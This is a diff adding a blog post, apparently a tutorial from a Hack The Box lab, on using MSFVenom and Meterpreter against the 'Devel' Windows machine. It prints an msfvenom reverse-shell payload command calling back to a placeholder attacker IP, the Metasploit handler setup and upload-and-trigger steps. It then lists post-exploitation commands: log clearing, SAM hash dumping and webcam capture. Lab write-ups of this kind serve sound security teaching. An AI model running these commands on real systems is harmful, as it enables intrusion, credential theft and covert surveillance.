@@ -1,0 +1,80 @@
+---
+title:      "MSFVenom and Meterpreter: The basics"
+date:       2018-09-11 12:20:20 +0100
+tags:       HackTheBox
+Category:   Cybersecurity
+comment:    header sizes are 2000x750
+header:
+  image:	/assets/images/2018-09-11-msfvenom/header.jpg
+  teaser:	/assets/images/2018-09-11-msfvenom/header.jpg
+  caption:	"Photo credit: [**Unsplash**](https://unsplash.com)"
+---
+
+I just recently successfully gained root (or rather, Administrator, because it's a Windows box) on the **Devel** machine in [Hack The Box](https://hackthebox.eu).
+
+The machine itself is very easy, and there are lots of writeups on it, I'm sure, so this won't be another one. However, one thing it made really clear and simple was learning **MSFVenom** and getting to use reverse shells in a realistic scenario. Therefore, I'll use the machine as an example to illustrate the usage of MSFVenom.
+
+In this case, the machine is running IIS, with an FTP server that allows anonymous uploads, and an HTTP server running on the traditional port 80.
+
+This is where MSFVenom comes in handy: We can upload arbitrary files and trigger their execution.
+
+Some information:
+- The victim's IP is `10.10.10.5`
+- Our IP is `x.y.z.w`
+- We have no firewalls blocking inbound connections (this is a requirement if you want to have reverse shells connect back to you)
+
+## The reverse shell
+```
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=x.y.z.w LPORT=1337 -f aspx > devel.aspx
+```
+
+This:
+- Sets the payload to be a reverse TCP meterpreter shell (for Metasploit), for Windows machines. You can query the full list of payloads by running `$ msfvenom -l payloads`
+- Sets our IP to be `x.y.z.w` (the victim machine must be able to reach us on that IP)
+- Sets our listening port to be `1337` (remember this, you'll need it to configure the listening end of the reverse shell: Metasploit)
+- Sets the format to be ASPX, C#
+- Creates a file called `devel.aspx` in the current directory
+
+## Configure Metasploit
+
+Now we have to configure Metasploit to listen to remote connections, using the same parametres given to MSFVenom.
+
+(The following commands are to be executed sequentially in a Metasploit Console)
+
+```
+use multi/handler
+set payload windows/meterpreter/reverse_tcp
+set lhost x.y.z.w
+set lport 1337
+set ExitOnSession false
+exploit -j
+```
+
+Metasploit is now ready to accept connections to port `1337` and the specified IP address (in this case `x.y.z.w`)
+
+## Triggering the reverse shell
+
+In this case, now that we have the `devel.aspx` file, we have to upload it via FTP. Because the FTP is pointing to the same directory as the HTTP server, we can just drop it there, and then navigate to `http://10.10.10.5/devel.aspx`. A blank page will appear, but if we did everything correctly, a new line will appear in the listening console. It will say something similar to: `Meterpreter session 1 opened (x.y.z.w:1337 -> 10.10.10.5:49160)`.
+
+At this point, we can list sessions by issuing `sessions -l` at the Metasploit console, and attach to the newly opened session by running `sessions <SESSION ID>`, in this case, the session ID is 1, so `sessions 1` attaches correctly to the shell.
+
+## Meterpreter
+
+Now we're in a Meterpreter Windows session, we can issue the following commands (note that to specify the folder separator in Meterpreter, you must use double slashes `//` and not the standard Windows backslash `\`):
+- `ls` or `dir`: lists the files and directories
+- `cd`: changes directory, behaves just like Linux systems
+- `pwd`: shows the full path for the current directory, similar to Linux as well
+- `background`: sends the Meterpreter session to the background, and resumes your Metasploit session, you can always return by reattaching the session with `sessions <SESSION ID>`
+- `cat`: prints text files to the screen, like the Linux command of the same name
+- `download` or `upload`: respectively download or upload files from/to the machine
+- `getuid`: returns the user the reverse shell is running with, useful to let us know if we gained Administrator access
+- `clearev`: clears the *Application*, *System* and *Security* logs for the machine
+- `execute`: runs an arbitrary command given as the argument
+- `hashdump`: dumps the contents of the *SAM* database
+- `idletime`: displays how much time has passed since the user was active
+- `ipconfig`: retrieves the network interface configuration
+- `ps`: like the Linux tool of the same name, displays a list of running processes in the victim machine
+- `shell`: invokes a standard shell
+- `webcam_list`: displays currently connected and configured web cams on the victim machine
+- `webcam_snap`: takes a picture from a connected camera, and saves it to the current working directory with a random filename
+
